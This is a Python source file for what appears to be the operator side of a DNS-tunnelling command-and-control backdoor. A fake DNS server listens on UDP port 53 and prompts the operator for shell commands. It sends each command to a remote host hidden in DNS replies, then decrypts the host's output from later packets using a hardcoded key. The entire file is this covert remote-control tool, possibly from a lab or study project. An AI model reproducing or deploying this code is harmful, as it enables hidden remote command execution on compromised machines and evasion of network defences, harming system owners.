from datetime import datetime
import socket
import base64
from dataEncryptor import dataEncryptor
from payload import Payload

class DNSServer:
    def __init__(self,port,ip):
        self.port = port
        self.ip = ip

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.ip,self.port))
        print("UDP Server Started Listening")
        commandRan = False
        while 1:
            req, address = sock.recvfrom(512) #start listening
            printWithTime("UDP", f"Received {len(req)} bytes from {address}")
            if commandRan:
                dataList = list(req)
                newDataList = list()
                found = False
                count = 0
                for i in dataList:
                    if i == 33:
                        found = True
                        count += 1
                        if count == 2:
                            break
                    elif found:
                        newDataList.append(i)
                bytesNewDataList = bytearray(newDataList)
                d = dataEncryptor()
                output = d.decrypting(bytesNewDataList, "hellothisismebob")
                output = output.decode('utf-8')
                output2 = ""
                for i in repr(output):
                    if i == "'":
                        continue
                    elif i == "\\":
                        break
                    else:
                        output2 += i 
                print("Output of " + command + ":" + output2)       
                commandRan = False
            command = input("Enter a command:")
            p = Payload("192.168.7.202")
            p.payload(sock,req,command)
            commandRan = True

def printWithTime(head, message):
        curr_time = datetime.now().strftime("%H:%M:%S.%f")
        print(f"[{head}] [{curr_time[:-3]}]", message)

def main():
    dns = DNSServer(53,"192.168.7.168")
    dns.start()

main()